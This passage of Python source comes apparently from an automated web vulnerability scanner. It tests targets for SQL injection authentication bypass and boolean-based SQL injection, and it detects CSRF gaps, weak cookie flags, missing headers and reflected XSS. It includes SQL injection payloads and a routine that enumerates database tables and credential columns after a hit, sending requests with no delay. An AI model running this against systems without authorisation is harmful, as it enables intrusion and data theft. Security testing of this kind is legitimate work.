                                finding.db_structure = db_info
                            
                            return findings
                        
                        # HTML success indicators
                        if baseline_hash:
                            response_hash = hashlib.md5(html.encode()).hexdigest()
                            if response_hash != baseline_hash and abs(len(html) - baseline_length) > 200:
                                success_indicators = ['welcome', 'dashboard', 'profile', 'logout', 'account', 'logged in', 'success']
                                html_lower = html.lower()
                                if any(indicator in html_lower for indicator in success_indicators):
                                    self._log(f"✓ SQLi AUTH BYPASS in '{param}' with: {payload[:40]}...", "success", force_flush=True)
                                    finding = self._create_finding(
                                        attack_type=AttackType.SQLI,
                                        severity=SeverityLevel.CRITICAL,
                                        title=f"SQL Injection Authentication Bypass in '{param}'",
                                        description=f"Successfully bypassed authentication using SQL injection payload.",
                                        url=url,
                                        parameter=param,
                                        payload=payload,
                                        evidence=f"Response: {len(html)} bytes (baseline: {baseline_length}), Status: {status}"
                                    )
                                    findings.append(finding)
                                    self._notify_finding(finding)
                                    return findings
            
            except Exception as e:
                self._log(f"Error: {str(e)[:50]}", "warning", force_flush=True)
                logger.debug(f"SQLi test error: {e}")
            
            # No delay - we want max speed!
        
        # Test boolean-based (if no error-based found)
        if not findings:
            true_payload = "1' AND '1'='1"
            false_payload = "1' AND '1'='2"
            
            try:
                true_url = self._inject_into_url(url, param, true_payload)
                false_url = self._inject_into_url(url, param, false_payload)
                
                async with self._semaphore:
                    async with self._session.get(true_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        true_html = await response.text()
                        true_length = len(true_html)
                
                async with self._semaphore:
                    async with self._session.get(false_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        false_html = await response.text()
                        false_length = len(false_html)
                
                self.progress.requests_made += 2
                
                # Significant difference suggests boolean-based SQLi
                if abs(true_length - false_length) > 100 and abs(true_length - baseline_length) < 100:
                    finding = self._create_finding(
                        attack_type=AttackType.SQLI,
                        severity=SeverityLevel.HIGH,
                        title=f"Potential Boolean-based SQL Injection in '{param}'",
                        description="Response varies based on boolean SQL conditions, indicating possible blind SQL injection.",
                        url=url,
                        parameter=param,
                        payload=f"{true_payload} vs {false_payload}",
                        evidence=f"True condition: {true_length} bytes, False condition: {false_length} bytes",
                        confidence=0.7
                    )
                    findings.append(finding)
                    self._notify_finding(finding)
            
            except Exception as e:
                logger.debug(f"Boolean SQLi test error: {e}")
        
        return findings
    
    async def _enumerate_database(self, url: str, param: str, method: str = 'GET', db_type: str = 'sqlite') -> Optional[str]:
        """
        Try to enumerate database structure after finding SQLi vulnerability.
        
        Returns extracted database schema information if successful.
        """
        self._log(f"Attempting database enumeration ({db_type})...", "info")
        
        payloads = self.DB_ENUM_PAYLOADS.get(db_type, self.DB_ENUM_PAYLOADS['generic'])
        extracted_info = []
        
        for payload in payloads:
            try:
                if method == 'POST':
                    # For JSON APIs
                    parsed = urlparse(url)
                    data = {param: payload}
                    
                    async with self._semaphore:
                        async with self._session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            html = await response.text()
                            self.progress.requests_made += 1
                else:
                    test_url = self._inject_into_url(url, param, payload)
                    async with self._semaphore:
                        async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            html = await response.text()
                            self.progress.requests_made += 1
                
                # Look for table names, column info in response
                # SQLite master patterns
                table_patterns = [
                    r'CREATE TABLE[^;]+',
                    r'(?:Users?|Admins?|Products?|Orders?|Customers?|Accounts?|Sessions?|Tokens?)',
                    r'"(?:id|name|email|password|username|token|hash)"',
                ]
                
                for pattern in table_patterns:
                    matches = re.findall(pattern, html, re.IGNORECASE)
                    if matches:
                        for match in matches[:5]:  # Limit matches
                            if match not in extracted_info and len(match) > 3:
                                extracted_info.append(match)
                                self._log(f"  Found: {match[:50]}...", "info")
                
            except Exception as e:
                logger.debug(f"DB enum error: {e}")
        
        if extracted_info:
            return "\\n".join(extracted_info[:20])  # Return up to 20 items
        return None
    
    async def _test_csrf_all_pages(self, pages: List[str]) -> List[VulnerabilityFinding]:
        """Test for CSRF vulnerabilities across all discovered pages."""
        all_findings = []
        tested_forms = set()  # Track tested form URLs to avoid duplicates
        
        self._log(f"Testing CSRF on {len(pages)} pages...", "info", force_flush=True)
        
        for page_url in pages:
            try:
                async with self._semaphore:
                    async with self._session.get(page_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        html = await response.text()
                        headers = dict(response.headers)
                        
                        target_info = {
                            'url': page_url,
                            'html': html,
                            'headers': headers
                        }
                        
                        findings = await self._test_csrf(target_info)
                        
                        # Filter out duplicates based on form URL
                        for finding in findings:
                            form_key = finding.url
                            if form_key not in tested_forms:
                                tested_forms.add(form_key)
                                all_findings.append(finding)
                                
            except Exception as e:
                logger.debug(f"CSRF test error for {page_url}: {e}")
        
        if all_findings:
            self._log(f"Found {len(all_findings)} CSRF vulnerabilities!", "warning", force_flush=True)
        else:
            self._log(f"No CSRF vulnerabilities found in {len(pages)} pages", "info")
        
        return all_findings
    
    async def _test_csrf(self, target_info: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for CSRF vulnerabilities."""
        findings = []
        html = target_info.get('html', '')
        url = target_info.get('url', '')
        headers = target_info.get('headers', {})
        
        self._log(f"Testing CSRF protections at {url[:50]}...", "info")
        
        # Check for SameSite cookie attribute
        set_cookie = headers.get('Set-Cookie', '')
        has_samesite = 'samesite=' in set_cookie.lower()
        
        soup = BeautifulSoup(html, 'html.parser')
        
        # Check traditional forms
        for form in soup.find_all('form'):
            method = form.get('method', 'GET').upper()
            if method != 'POST':
                continue
            
            action = form.get('action', '')
            form_url = urljoin(url, action) if action else url
            
            # Check for CSRF token
            has_csrf = False
            csrf_patterns = ['csrf', 'token', '_token', 'authenticity', 'xsrf']
            
            for inp in form.find_all('input', type='hidden'):
                name = (inp.get('name') or '').lower()
                if any(pattern in name for pattern in csrf_patterns):
                    has_csrf = True
                    break
            
            if not has_csrf and not has_samesite:
                self._log(f"✓ CSRF vulnerability found in form at {form_url[:50]}...", "warning")
                finding = self._create_finding(
                    attack_type=AttackType.CSRF,
                    severity=SeverityLevel.MEDIUM,
                    title="Missing CSRF Protection",
                    description=f"POST form at {form_url} does not have CSRF token protection or SameSite cookie attribute.",
                    url=form_url,
                    recommendations=[
                        "Implement CSRF tokens for all state-changing forms",
                        "Use SameSite cookie attribute (SameSite=Strict or SameSite=Lax)",
                        "Verify Origin/Referer headers",
                        "Use custom request headers for API calls"
                    ]
                )
                findings.append(finding)
                self._notify_finding(finding)
        
        # Check for API endpoints (common in SPAs)
        api_patterns = ['/api/', '/rest/', '/graphql', '/v1/', '/v2/']
        if any(pattern in url.lower() for pattern in api_patterns):
            # Test if API accepts requests without CSRF token
            try:
                # Try a POST request to see if there's CSRF protection
                async with self._semaphore:
                    async with self._session.post(url, json={'test': 'data'}, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        self.progress.requests_made += 1
                        
                        # Check for CSRF-related headers
                        csrf_headers = ['X-CSRF-Token', 'X-XSRF-Token', 'X-Requested-With']
                        has_csrf_header = any(h in response.headers for h in csrf_headers)
                        
                        if response.status != 403 and not has_csrf_header and not has_samesite:
                            self._log(f"✓ CSRF vulnerability found in API endpoint {url[:50]}...", "warning")
                            finding = self._create_finding(
                                attack_type=AttackType.CSRF,
                                severity=SeverityLevel.MEDIUM,
                                title="API Endpoint Missing CSRF Protection",
                                description=f"API endpoint {url} accepts state-changing requests without CSRF tokens or custom headers.",
                                url=url,
                                evidence=f"Status: {response.status}, No CSRF headers found",
                                recommendations=[
                                    "Require custom headers (e.g., X-Requested-With: XMLHttpRequest)",
                                    "Use CSRF tokens in request headers",
                                    "Implement SameSite cookie attribute",
                                    "Validate Origin/Referer headers"
                                ]
                            )
                            findings.append(finding)
                            self._notify_finding(finding)
            except Exception as e:
                logger.debug(f"CSRF API test error: {e}")
        
        if not findings:
            self._log(f"  No CSRF vulnerabilities detected", "info")
        
        return findings
    
    async def _test_auth(self, url: str, target_info: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for authentication vulnerabilities."""
        findings = []
        html = target_info.get('html', '')
        headers = target_info.get('headers', {})
        
        # Check for insecure cookie settings
        set_cookie = headers.get('Set-Cookie', '')
        if set_cookie:
            if 'httponly' not in set_cookie.lower():
                finding = self._create_finding(
                    attack_type=AttackType.AUTH,
                    severity=SeverityLevel.MEDIUM,
                    title="Cookie Missing HttpOnly Flag",
                    description="Session cookies are accessible via JavaScript, making them vulnerable to XSS attacks.",
                    url=url,
                    evidence=set_cookie[:100]
                )
                findings.append(finding)
            
            if 'secure' not in set_cookie.lower() and url.startswith('https'):
                finding = self._create_finding(
                    attack_type=AttackType.AUTH,
                    severity=SeverityLevel.MEDIUM,
                    title="Cookie Missing Secure Flag",
                    description="Cookies may be transmitted over unencrypted connections.",
                    url=url
                )
                findings.append(finding)
        
        # Check for security headers
        security_headers = {
            'X-Frame-Options': 'Missing X-Frame-Options header (Clickjacking)',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
            'Content-Security-Policy': 'Missing Content-Security-Policy header',
            'Strict-Transport-Security': 'Missing HSTS header'
        }
        
        for header, message in security_headers.items():
            if header.lower() not in [h.lower() for h in headers.keys()]:
                finding = self._create_finding(
                    attack_type=AttackType.AUTH,
                    severity=SeverityLevel.LOW,
                    title=message,
                    description=f"The {header} header is not set, which may expose the application to certain attacks.",
                    url=url
                )
                findings.append(finding)
        
        return findings
    
    def _inject_into_url(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, ''
        ))
    
    def _check_xss_reflection(self, html: str, payload: str, is_json: bool = False) -> bool:
        """Check if XSS payload is reflected in an exploitable way."""
        import html as html_lib
        import urllib.parse
        
        # Normalize for comparison
        html_lower = html.lower()
        payload_lower = payload.lower()
        
        # Direct unescaped reflection - most dangerous
        if payload in html:
            return True
        
        # Check for case-insensitive reflection
        if payload_lower in html_lower:
            return True
        
        # Check for dangerous patterns being reflected
        # These are the key XSS indicators that must NOT be escaped
        dangerous_patterns = [
            ('<script', '</script>'),
            ('onerror=', 'onerror='),
            ('onload=', 'onload='),
            ('onclick=', 'onclick='),
            ('onfocus=', 'onfocus='),
            ('onmouseover=', 'onmouseover='),
            ('<img', 'src='),
            ('<svg', 'onload='),
            ('<iframe', 'src='),
            ('javascript:', ''),
            ('<body', 'onload='),
        ]
        
        for pattern_start, pattern_check in dangerous_patterns:
            if pattern_start in payload_lower:
                # Check if this pattern appears unescaped in HTML
                if pattern_start in html_lower:
                    # Verify it's not HTML-escaped
                    escaped_pattern = html_lib.escape(pattern_start)
                    if escaped_pattern not in html and pattern_start in html_lower:
                        return True
        
        # Check specifically for script tags being reflected
        if '<script>' in payload_lower or '<script ' in payload_lower:
            if '<script>' in html_lower or '<script ' in html_lower:
                # Verify not escaped as &lt;script&gt;
                if '&lt;script' not in html_lower:
                    return True
        
        # Check for event handlers being reflected
        event_handlers = ['onerror', 'onload', 'onclick', 'onfocus', 'onmouseover', 'onmouseout', 
                         'onkeydown', 'onkeyup', 'onchange', 'onsubmit', 'ontoggle', 'onstart']
        for handler in event_handlers:
            if f'{handler}=' in payload_lower:
                if f'{handler}=' in html_lower:
                    return True
        
        # For JSON responses, check if HTML is reflected without JSON escaping
        if is_json:
            # In JSON, < and > should be escaped as \u003c and \u003e
            if '<' in payload and '<' in html and '\\u003c' not in html:
                return True
        
        return False
    
    def _extract_evidence(self, html: str, payload: str, context: int = 100) -> str:
        """Extract evidence snippet around the payload."""
        idx = html.find(payload)
        if idx == -1:
            return ""
        
        start = max(0, idx - context)
        end = min(len(html), idx + len(payload) + context)
        
        return html[start:end]
    
    def _create_finding(self, **kwargs) -> VulnerabilityFinding:
        """Create a new finding with auto-generated ID."""
        self._finding_counter += 1
        finding_id = f"PW-{self._finding_counter:04d}"
        
        if 'timestamp' not in kwargs:
            kwargs['timestamp'] = datetime.now()
        if 'confidence' not in kwargs:
            kwargs['confidence'] = 0.8
        if 'recommendations' not in kwargs:
            kwargs['recommendations'] = []
        
        return VulnerabilityFinding(id=finding_id, **kwargs)
    
    def _create_error_result(self, url: str, error: str) -> Dict[str, Any]:
        """Create an error result."""
        return {
            'success': False,
            'target_url': url,
            'error': error,
            'scan_started': self.progress.start_time.isoformat(),
            'scan_completed': datetime.now().isoformat(),
            'duration_seconds': self.progress.elapsed_seconds,
            'findings': [],
            'summary': {
                'overall_risk': 'Unknown',
                'summary': f'Scan failed: {error}',
                'recommendations': ['Verify target is accessible', 'Check network connectivity']
            }
        }
    
    def _update_progress(self, phase: str, current: int, total: int):
        """Update progress information - throttled to prevent log spam."""
        # Only log if phase changed (prevents duplicate messages)
        if phase != self.progress.current_phase:
            self.progress.current_phase = phase
            logger.info(f"[{current}%] {phase}")
    
    def _report_progress(self):
        """Report current progress."""
        if self.on_progress:
            result = self.on_progress(self.progress)
            if asyncio.iscoroutine(result):
                asyncio.create_task(result)
    
    def _notify_finding(self, finding: VulnerabilityFinding):
        """Notify about a new finding."""
        self.progress.findings_count += 1
        logger.info(f"🔴 FOUND: {finding.title} ({finding.severity.value})")
        if self.on_finding:
            result = self.on_finding(finding)
            if asyncio.iscoroutine(result):
                asyncio.create_task(result)

